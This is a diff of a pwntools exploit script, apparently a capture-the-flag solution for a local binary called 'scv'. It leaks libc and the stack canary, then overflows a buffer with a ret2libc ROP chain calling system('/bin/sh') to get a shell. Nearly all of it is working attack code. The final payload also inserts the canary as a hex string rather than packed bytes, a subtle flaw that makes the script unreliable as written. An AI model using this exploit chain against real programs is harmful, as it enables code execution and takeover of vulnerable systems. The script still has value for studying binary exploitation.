@@ -7,9 +7,11 @@
 
 from pwn import *
 
+#+--------------------SETUP--------------------------+
 context.binary = './scv'
 conn = process('./scv')
 libc = ELF('libc-2.23.so')
+#+--------------------+++++++++----------------------+
 
 #+--------------------LEAK LIBC----------------------+
 #$rsi + 40d = libc
@@ -41,16 +43,46 @@ leaked_addr = unpack(leaked_addr, 'all', endian='little', sign=False)
 
 #Calculate offset
 #0x00007ffffecda299 - given base address
-libc_base = leaked_addr - 
-print('CALCULATED OFFSET --> ')
+#0x00007ffffecbf8b0 - base
+offset = 0x7ffffecda299 - 0x7ffffecbf8b0
+libc_base = leaked_addr - offset
+print("LIBC BASE --> " + hex(libc_base))
 #+---------------------------------------------------+
 
 
+#+------------------LEAK CANARY----------------------+
+conn.sendline('1')
+conn.recvuntil('>>')
+junk_fill = "A"*168
+conn.sendline(junk_fill)
+conn.recvuntil('>>')
+conn.sendline('2')
+canary = '\x00' + conn.recvuntil('>>').split('\n')[6][:7]
+canary = unpack(canary, 'all', endian='little', sign=False)
 
-'''
+print("LEAKED CANARY --> " + hex(canary))
+#+---------------------------------------------------+
+
+#+------------------BUILD ROP------------------------+
+pop_ret = 0x400ea3
+system = libc_base + libc.symbols['system']
+bin_sh = libc_base + libc.search('/bin/sh').next()
+rop = p64(pop_ret) + p64(bin_sh) + p64(system)
+#+---------------------------------------------------+
+
+#+--------------FINAL_PAYLOAD------------------------+
 payload = ''
+#final payload
+payload += "A"*168 + hex(canary) + "A"*8 + rop
+#+---------------------------------------------------+
 
+#+----------------SEND_FINAL------------------------+
+conn.sendline('1')
+conn.recvuntil('>>')
 conn.sendline(payload)
+conn.recvuntil('>>')
+
+conn.sendline('3')
+conn.recvline()#dunno why this is here
 
 conn.interactive()
-'''
